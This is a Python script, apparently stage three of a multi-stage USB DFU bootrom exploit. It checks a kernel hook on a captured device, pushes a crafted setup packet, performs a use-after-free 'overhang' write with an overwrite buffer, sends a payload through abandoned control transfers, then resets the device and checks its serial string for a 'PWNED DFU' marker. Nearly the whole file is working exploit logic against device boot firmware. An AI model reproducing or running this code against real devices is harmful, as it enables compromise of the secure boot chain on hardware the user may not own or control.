#!/usr/bin/env python3
"""stage3-final.py — execute stage 3 on the post-bridge knife-edge device.

Preconditions (measured live):
  - DFU device re-enumerated right after the stage-2 bridge port reset
  - ROM heap holds the knife-edge spray state (heap persists the reset)
  - the module raw0 hook re-captured the fresh Address Device

Runs: armed crit-IN (module, no status) -> UAF overhang write -> payload
-> final reset -> PWN marker verify. NO extra control traffic first.
"""
import sys
import time

import importlib.util
import os

_spec = importlib.util.spec_from_file_location(
    'exfin',
    os.path.join(os.path.dirname(os.path.abspath(__file__)),
                 'exploit-final.py'))
F = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(F)


def main():
    P = F.P
    R = F.R
    usb = P.LibUSB()
    P.LibUSB._current = usb
    payload, overwrite = P.load_payloads('classic')
    print('[stage3] payload=%d overwrite=%d' % (len(payload), len(overwrite)))

    # module capture check - NO usbfs traffic yet; re-arm the hook if stale
    import os
    fd_raw = os.open('/dev/raw0', os.O_RDWR)

    def mod_state():
        st = R.raw0_state(fd_raw)
        print('[module] xhci=0x%x slot=%d state=%d pushed=%d k_deq=%d ep0=0x%x'
              % (st['xhci'], st['slot'], st['state'], st['pushed'],
                 st['k_deq'], st['ep0']))
        return st

    st = mod_state()
    tries = 0
    while not st['state'] and tries < 3:
        tries += 1
        print('[stage3] capture flag down (state=%d) - port reset #%d'
              % (st['state'], tries))
        dev0, h0, d0, s0 = P.acquire(usb, want_serial=False)
        if dev0:
            usb.reset(h0)
            usb.lib.libusb_release_interface(h0, 0)
            usb.lib.libusb_close(h0)
        time.sleep(1.5)
        st = mod_state()
    if not st['state']:
        print('[module] NOT CAPTURED after resets - need module reload + '
              'fresh dance; aborting before writes')
        return 1
    # NOTE: the ep0 state print is an offset-suspect field; the push's own
    # return code is the verdict on ring health.

    # open the device (libusb open = no control traffic)
    dev, handle, desc, serial = P.acquire(usb, want_serial=False)
    if not dev:
        print('[fatal] device not openable')
        return 1
    print('[stage3] device open:', usb.describe(dev))

    # ---- B1: armed critical-IN (module push, no status TRB) ----------
    crit_setup = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00])
    rc = R.raw0_push(crit_setup, b'\x00' * 0x41, has_data=1, has_status=0,
                     dir_in=1, fd=fd_raw)
    print('[stage3] armed crit-IN push: rc=%d' % rc)
    if rc != 0:
        # ring forensics: is the ring view healthy enough to retry?
        try:
            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
            import importlib.util as _ilu
            _sp = _ilu.spec_from_file_location(
                'pf', os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                   'push-forensics.py'))
            PF = _ilu.module_from_spec(_sp)
            _sp.loader.exec_module(PF)
            head, vals = PF.ringdump(fd_raw)
            print('[ring] enq=%d cyc=%d hwdeq=0x%x epst=0x%x slot=%d'
                  % (head['enq'], head['cyc'], head['hwdeq'], head['epst'],
                     head['slot']))
            PF.pr_rows(vals, head, 0, 8)
        except Exception as e:
            print('[ring] dump failed: %r' % (e,))
        time.sleep(0.5)
        rc = R.raw0_push(crit_setup, b'\x00' * 0x41, has_data=1,
                         has_status=0, dir_in=1, fd=fd_raw)
        print('[stage3] armed crit-IN retry: rc=%d' % rc)
    if rc != 0:
        print('[stage3] push failed twice - fresh module load + dance needed')
        return 1

    usb.claim(handle)

    # ---- B2: THE UAF WRITE (overhang wLength=0x40, 128 bytes) ---------
    data = b'\xCC' * 0x40 + overwrite
    rc, info = usb.raw_ctrl(handle, 0x00, 0x00, 0x0000, 0x0000, 0x40,
                            data=data, abandon=True, cancel_at=0x80,
                            timeout_ms=3000, name='uaf-write')
    print('[stage3] UAF write: rc=%s info=%r' % (rc, info))

    # ---- B3: THE PAYLOAD (wLength=0x2C0, 768 bytes) -------------------
    data = b'\xCC' * 0x40 + payload
    rc, info = usb.raw_ctrl(handle, 0x21, 0x01, 0x0000, 0x0000, 0x2C0,
                            data=data, abandon=True, cancel_at=0x300,
                            timeout_ms=4000, name='payload')
    print('[stage3] payload: rc=%s info=%r' % (rc, info))

    # ---- verdict -------------------------------------------------------
    P.reset_and_release(usb, handle, settle=2.0)
    serial = P.verify(usb)
    print('[verify] serial: %r' % serial)
    if P.PWN_MARKER in serial:
        print('*** PWNED DFU ***')
        return 0
    print('[verify] not pwned; fresh DFU + full run again')
    return 1


if __name__ == '__main__':
    sys.exit(main())
